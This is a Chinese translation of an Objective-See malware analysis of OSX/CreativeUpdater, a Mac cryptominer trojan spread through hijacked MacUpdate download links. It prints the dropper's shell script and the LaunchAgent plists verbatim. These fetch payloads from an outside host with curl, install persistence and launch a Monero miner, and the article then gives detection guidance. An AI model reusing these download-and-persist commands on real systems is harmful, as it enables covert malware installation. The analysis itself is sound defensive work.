# 供应链攻击：分析OSX/CreativeUpdater木马

阅读量 **244285**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-02-08 16:27:39

 **x**

##### 译文声明

本文是翻译文章，文章原作者 objective-see，文章来源：objective-see.com

原文地址：<https://objective-see.com/blog/blog_0x29.html>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01e7ba63ba1ff6811a.jpg)

## 一、前言

当我们的脚步刚跨过2018年的门槛，已经有一款Mac木马环绕我们周围，挥之不去。这款木马针对的是macOS用户，借助热门的[MacUpdate网站](https://www.macupdate.com/)上被感染的应用来传播。2月1日，MacUpdate网站的编辑“Jess-MacUpdate”在几个流行的应用页面中发表了一些评论，比如对FireFox的评论如下：

![](https://p4.ssl.qhimg.com/t017dd6c0180fc33133.png)

在本文中，我们分析了这款恶意软件，简要讨论了该软件的本地持久化机制以及具体功能。

## 二、致谢

在深入分析之前，我想先感谢一下这几位安全研究人员以及小伙伴：

**@noarfromspace**

因为他我才注意到这款恶意软件，他也提供了相关链接，发表了富有洞察力评论，也是因为他这款恶意软件才被命名为OSX/CreativeUpdater。

![](https://p2.ssl.qhimg.com/t010252d9bab7cef83d.png)

@thomasreed

这位小伙伴也写了篇[博客](https://blog.malwarebytes.com/threat-analysis/2018/02/new-mac-cryptominer-distributed-via-a-macupdate-hack/)，全方面分析了这款恶意软件，这篇文章绝对值得一读，大家可以好好参考一下。

![](https://p0.ssl.qhimg.com/t014f0eda1c293a8135.png)

@marc _etienne_

这位小伙伴在发现及分析这款恶意软件方面提供了非常宝贵的见解。

## 三、恶意软件分析

情况是这样的，当某个用户正在开心地浏览MacUpdate网页时，找到了Firefox软件（或者OnyX以及Deeper），然后决定下载这款软件。正如Thomas
Reed说的那样，MacUpdate上这款软件的下载链接已经被他人恶意修改过，会指向由黑客控制的恶意软件URL：

“伪造的Firefox应用来自于`download-installer.cdn-mozilla.net`（注意该域名的结尾为`cdn-mozilla.net`，并非`mozilla.net`。这是一种常见的欺诈方法，让用户误认为软件来自于合法的网站）。”

因此，用户下载的并非合法的Firefox应用，而是包含木马功能、经过签名的一个dmg文件（所使用的Apple开发者ID为Ramos Jaxson）：

![](https://p1.ssl.qhimg.com/t019521222cb2d4131c.png)

我们可以通过双击方式或者`hdiutil`工具来挂载这个磁盘镜像：

    
    
    $ hdiutil attach -noverify ~/Downloads/Firefox 58.0.2.dmg 
    /dev/disk3s2  Apple_HFS  /Volumes/Firefox
    

![](https://p2.ssl.qhimg.com/t01b3dbe6612bdfa721.png)

磁盘镜像中显示的应用程序为`Firefox.app`，该应用同样使用相同的开发者ID进行签名。磁盘镜像以及应用都经过签名，这表明默认情况下Gatekeeper并不会阻止这款恶意软件的执行。

观察这款Firefox木马应用包中的内容，我们可以看到一个主程序（`MozillaFirefox`），`Resources`目录下还包含另一个Firefox应用及脚本（文件名非常直白，为`script`）：

![](https://p3.ssl.qhimg.com/t0135dba72abbfc39bd.png)

检查第二个Firefox应用的数字签名，我们发现这是Mozilla出品的官方应用。我们可以通过[WhatsYourSign](https://objective-see.com/products/whatsyoursign.html)这款Finder扩展，通过可视化界面查看应用的签名信息：

![](https://p2.ssl.qhimg.com/t01255cea70bffc1e8e.png)

很快我们就会看到，这款恶意软件会执行合法的Firefox应用，这样一来用户就无法察觉到任何恶意行为。

反编译`MozillaFirefox`这个主执行程序后，我们可以发现该程序会查找`script`文件：

    
    
    void -[ScriptExecController loadAppSettings](void * self, void * _cmd) {
    
      r13 = [[var_1B0 pathForResource:@"script" ofType:0x0] retain];
      r15 = @selector(defaultManager);
      r12 = [_objc_msgSend_100015138(@class(NSFileManager), r15) retain];
      rbx = [[var_1B0 pathForResource:@"script" ofType:0x0] retain];
      r14 = [r12 fileExistsAtPath:rbx];
      if (r14 == 0x0) {
              [Alerts fatalAlert:@"Corrupt app bundle" 
                      subText:@"Script missing from application bundle."];
      }
    

接下来，程序会调用`-[ScriptExecController executeScript]`方法，执行该文件：

    
    
    void -[ScriptExecController executeScript](void * self, void * _cmd) {
    
      rbx = self;
    
      [rbx prepareForExecution];
      [rbx prepareInterfaceForExecution];
      *(int8_t *)(rbx + r14) = 0x1;
      if (*(int32_t *)&rbx->execStyle == 0x1) {
              rsi = @selector(executeScriptWithPrivileges);
      }
      else {
              rsi = @selector(executeScriptWithoutPrivileges);
      }
      (*_objc_msgSend)(rbx, rsi);
    
      return;
    }
    
    void -[ScriptExecController executeScriptWithoutPrivileges](void * self, void * _cmd) {
      r13->task = [[NSTask alloc] init];
    
      [r13->task setLaunchPath:r13->interpreterPath];
      [r13->task setArguments:r13->arguments];
    
      [r13->task launch];
    
      ...
    
    }
    

根据@noarfromspace在Twitter上的描述，攻击者使用[Platypus](https://www.sveinbjorn.org/platypus)这款合法的开发者工具来构造OSX/CreativeUpdater。Platypus官方上有这样一段话：

“Platypus是一款Mac OS
X开发者工具，可以通过解释型脚本（如shell脚本、Perl、Ruby以及Python程序）来创建原生的Mac应用，具体原理是将脚本以及运行该脚本的原生可执行文件捆绑在应用程序包中，实现运行效果。”

这一段话可以解释为什么主应用程序（比如Firefox.app木马）会在运行时执行`script`文件。

之前我们也见过Platypus的身影，还记得OSX/Eleanor吗：

![](https://objective-see.com/images/blog/blog_0x29/eleanor.png)

之前我在Twitter上提到过，OSX/Eleanor同样也会借助MacUpdate来传播：

![](https://p4.ssl.qhimg.com/t018aad0545a6f272e2.png)

这一点耐人寻味，它们是否有所关联？谁知道呢。

继续分析，我们来观察一下恶意应用启动时所执行的那个脚本：

    
    
    $ cat Firefox.app/Contents/Resources/script 
    
    open Firefox.app
    if [ -f ~/Library/mdworker/mdworker ]; then
      killall MozillaFirefox
    else
      nohup curl -o ~/Library/mdworker.zip 
      https://public.adobecc.com/files/1U14RSV3MVAHBMEGVS4LZ42AFNYEFF
              ?content_disposition=attachment 
      &&  unzip -o ~/Library/mdworker.zip -d ~/Library 
      &&  mkdir -p ~/Library/LaunchAgents 
      &&  mv ~/Library/mdworker/MacOSupdate.plist ~/Library/LaunchAgents 
      &&  sleep 300 
      &&  launchctl load -w ~/Library/LaunchAgents/MacOSupdate.plist 
      &&  rm -rf ~/Library/mdworker.zip 
      &&  killall MozillaFirefox &
    

根据Thomas Reed的描述：

“……这段代码首先会尝试打开一个欺诈应用。接下来，如果恶意软件已经安装过，这段代码会结束释放器进程，因为此时已经不需要再安装一次，

如果恶意软件没安装过，那么这段代码会下载恶意软件，将其解压到用户的Library文件夹中……代码也会安装一个恶意启动代理文件（`MacOSupdate.plist`），该文件会反复运行另一个脚本。”

换句话说，这段代码的功能是下载并安装一个持久性载荷。那么这是什么载荷呢？

虽然恶意软件希望下载的zip文件已经不复存在（从`https://public.adobecc.com/files/1U14RSV3MVAHBMEGVS4LZ42AFNYEFF`下载`mdworker.zip`文件），幸运的是我们可以通过VirusTotal上获取这个文件。

首先，我们可以观察一下`MacOSupdate.plist`文件：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" ...>
    <plist version="1.0">
    <dict>
    <key>Label</key>
    <string>MacOSupdate</string>
    <key>ProgramArguments</key>
    <array>
      <string>sh</string>
      <string>-c</string>
      <string>launchctl unload -w ~/Library/LaunchAgents/MacOS.plist 
              && rm -rf ~/Library/LaunchAgents/MacOS.plist && 
              curl -o ~/Library/LaunchAgents/MacOS.plist 
              https://public.adobecc.com/files/1UJET2WD0VPD5SD0CRLX0EH2UIEEFF?
                content_disposition=attachment 
              && launchctl load -w ~/Library/LaunchAgents/MacOS.plist 
              && ~/Library/mdworker/mdworker</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    </dict>
    </plist>
    

好吧，这个文件的功能只是下载并安装另一个`MacOS.plist`。

观察下载的这几个`MacOS.plist`文件，我们可以看到这些文件会反复执行`~/Library/mdworker/`目录中的`mdworker`程序：

    
    
    //version 1
    $ cat ~/Library/LaunchAgents/MacOS.plist
    
    ...
    <key>ProgramArguments</key>
    <array>
      <string>sh</string>
      <string>-c</string>
      <string>
        ~/Library/mdworker/mdworker -user sarahmayergo1990@gmail.com -xmr
        -proxy socks://104.236.13.101:1080
      </string>
    </array>
    
    //version 2
    $ cat ~/Library/LaunchAgents/MacOS.plist
    
    <key>ProgramArguments</key>
    <array>
      <string>sh</string>
      <string>-c</string>
      <string>
        ~/Library/mdworker/mdworker -user walker18@protonmail.ch -xmr
      </string>
    </array>
    

在虚拟机中运行`mdworker`程序，我们可以发现这是命令行版本的[MinerGate](https://minergate.com/)挖矿程序，即`minergate-cli`：

    
    
    $ ./mdworker -help
    Usage:
    minergate-cli [-version] -user <email> [-proxy <url>] 
                  -<currency> <threads> [<gpu intensity>] 
                  [-<currency> <threads> [<gpu intensity>] ...] 
                  [-o <pool> -u <login> [-t <threads>]
                  [-i <gpu intensity>]]
    

任何人都可以从[minergate.com/downloads/console](https://minergate.com/downloads/console)下载这个应用程序：

![](https://p5.ssl.qhimg.com/t0167a1f0c644a56ac6.png)

由于攻击者通过`-xmr`标志来调用这款挖矿程序，因此被感染的计算机会挖掘门罗币（Monero）。关于其中出现的邮箱地址，Thomas认为挖矿软件会“周期性地连接到minergate.com，使用邮箱地址作为登录账户”。

现在我们对这款恶意软件的目的已经摸得一清二楚：挖掘加密货币。结果并没有让人特别兴奋，但由此我们可以看到针对macOS的挖矿攻击活动已经变得越来越多。

如果你想找出幕后黑手，可以从磁盘镜像文件中找到一些蛛丝马迹。如果我们仔细观察这些文件（@noarfromspace已经做过相关[分析](https://twitter.com/noarfromspace/status/959548339468623873)），我们可以在dmg文件的根目录中发现一个`.DS_Store`文件。

    
    
    $ ls -lart /Volumes/Firefox/ | grep .DS_Store 
    -rw-r--r--@  1 user  staff   10244 Jan 31 11:18 .DS_Store
    

根据[维基百科](https://en.wikipedia.org/wiki/.DS_Store)的描述，“`.DS_Store`文件可以存储这个文件夹的自定义属性，比如图标位置以及背景图片设置等”。然而，`.DS_Store`文件也可能会包含路径信息，比如攻击者主机上`.dmg`文件的原始（完整）路径。

我们可以查看每个`.DS_Store`文件中包含的字符串：

    
    
    $ strings -a .DS_Store | grep tiago
    tiagobrandaomateus
    /Users/tiagobrandaomateus/teste/macupdate/Firefox_temp.dmg
    
    
    $ strings -a /Volumes/OnyX 3.4.2/.DS_Store | grep -i tiago
    tiagobrandaomateus
    /Users/tiagobrandaomateus/teste/macupdate/OnyX 3.4.2_temp.dmg
    
    
    $ strings -a /Volumes/Deeper 2.2.7/.DS_Store | grep -i tiago
    tiagobrandaomateus
    /Users/tiagobrandaomateus/macupdate/deeper-app/Deeper 2.2.7_temp.dmg
    

这个结果非常有趣，可能Tiago Brandão Mateus就是幕后黑手。

## 四、总结

在本文中，我们从技术角度分析了新发现的一款macOS挖矿程序：OSX/CreativeUpdater。虽然这款恶意软件并没有特别复杂，隐藏性也不高，但由于攻击者利用MacUpdate作为感染源，因此很有可能会感染大量用户。

最后，让我们来回答几个问题。

Q：怎么才会感染OSX/CreativeUpdater？

A：从MacUpdates上下载被感染过的应用程序。

具体包括如下几个应用程序：

1、2018年2月1日以后的Firefox 58.0.2；

2、2018年2月1日以后的Onyx（如3.4.2版本）；

3、2018年2月1日以后的Deeper（如2.2.7版本）。

Q：我还有没有可能被感染？

A：不大可能。根据MacUpdate的说法，他们“已经移除了恶意链接”。此外，Apple已经吊销了用来签名恶意磁盘镜像及应用的证书：

![](https://p4.ssl.qhimg.com/t01b465b84fcb7892ee.png)

一旦相关证书被吊销，磁盘镜像再也不会被挂载，应用也不会通过UI界面得到运行机会。

![](https://p3.ssl.qhimg.com/t01eca52c4ab2df7f92.png)

Q：怎么判断自己是否感染了OSX/CreativeUpdater？

A：首先检查系统上是否正在运行`mdworker`进程或者`sysmdworker`进程（该进程位于`~/Library/mdworker/`目录中）：

    
    
    $ ps aux | grep [/]Library/mdworker/
    
    user 2199  /Users/user/Library/mdworker/mdworker
    

用户也可以查找恶意软件用来实现本地持久化所留下的信息，包括如下文件以及目录：

    
    
    ~/Library/mdworker/
    ~/Library/LaunchAgents/MacOSupdate.plist
    

我们也可以使用[KnockKnock](https://objective-see.com/products/knocknock.html)工具显示plist启动代理文件（`~/Library/mdworker/MacOSupdate.plist`）：

![](https://objective-see.com/images/blog/blog_0x29/knockknock.png)

Q：在被感染的系统上，OSX/CreativeUpdater会执行哪些操作？

A：攻击者开发OSX/CreativeUpdater的目的只是挖掘门罗币（XMR）。虽然这款恶意软件会大量占用用户CPU资源，但也只能带来这种副作用。需要注意的是，由于这款恶意软件具备自我更新功能，因此攻击者后面可能会提供自定义的攻击载荷。然而，目前为止我们并没有观察到这种现象。

Q：你的工具可以阻止这个安全风险吗？

A：那是自然。

比如，[BlockBlock](https://objective-see.com/products/blockblock.html)会检测到恶意软件的本地持久化操作（当恶意软件通过`curl`下载并创建plist启动代理时）：

![](https://objective-see.com/images/blog/blog_0x29/blockblock.png)

当恶意软件通过`curl`下载各种组件时，[LuLu](https://objective-see.com/products/LuLu.html)也会弹出警告窗口：

![](https://objective-see.com/images/blog/blog_0x29/lulu.png)

这就是我们对OSX/CreativeUpdater的分析过程，感谢大家的阅读。

本文翻译自objective-see.com [原文链接](https://objective-see.com/blog/blog_0x29.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/97731](/post/id/97731)

安全客 - 有思想的安全新媒体

本文转载自: [objective-see.com](https://objective-see.com/blog/blog_0x29.html)

如若转载,请注明出处： <https://objective-see.com/blog/blog_0x29.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [供应链](/tag/供应链)
  * [OSX/CreativeUpdater](/tag/OSX/CreativeUpdater)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

